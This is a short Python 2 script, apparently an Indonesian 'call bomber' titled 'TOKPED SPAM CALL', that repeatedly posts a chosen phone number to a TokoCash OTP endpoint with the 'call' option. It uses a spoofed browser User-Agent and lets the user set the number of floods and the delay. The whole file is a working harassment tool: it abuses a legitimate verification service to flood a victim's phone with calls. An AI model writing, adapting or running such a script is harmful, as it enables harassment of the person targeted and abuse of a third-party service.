#-*-coding:utf8;-*-
#qpy:2
#qpy:console

print "This is console module"
import requests
import time
import json
import os

def tlkom(n,t, j):
    counter = 0
    while counter <= j:
        counter += 1
        print "\nTEST: %s\nPanggil : %s" % (counter, n)
        url = "https://www.tokocash.com/oauth/otp"
        data1 = {"msisdn":n,
                "accept":"call"}
        headers = {"Content-Type":"application/x-www-form-urlencoded; charset=utf-8",
                   "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}
        r = requests.post(url,data=data1, headers=headers)  
        parsing = json.loads(r.text)
        try:
            if parsing["data"].keys()[0] == u'otp_attempt_left':
                print "SUCCES"
        except:
            print parsing
            print "Error"
        time.sleep(t)
    print "\nSelesai"
if __name__ == "__main__":
    os.system("clear")
    #no = raw_input("Nomor: ")
    #jml = int(raw_input("Jumlah Flood: "))
    #timeout = int(raw_input("Delay/Jeda: "))
    print "\t-TOKPED SPAM CALL"
    print "\t-Made by Handika Pratama "
    print "\t-Python Coding: Qiuby Zhukhi"
    print "\t--[PBM]-- TEAM 100% BAXOT"
    print "\n"
#Ini kalau mau isi lewat terminal input metode
    no = raw_input("Nomor: ")
    jml = int(raw_input("Jumlah Flood: "))
    timeout = int(raw_input("Delay/Jeda: "))
    """
    Dibawah ini kalau mau isi lewat code langsung.
    kalau pake ini,
    Hapus 3 Tanda tagar (#) dan hapus Variabel script no,jum,timeout serta isinya
    yang terletak tepat di atas pesan ini.
    """

  #  no = "082347" # Nomor HP
 #   jml = 0 #flood
#    timeout = 5# jeda
    requests = requests.session()
    tlkom(no, timeout, jml)
else:
    print "Tadaaaa :v"
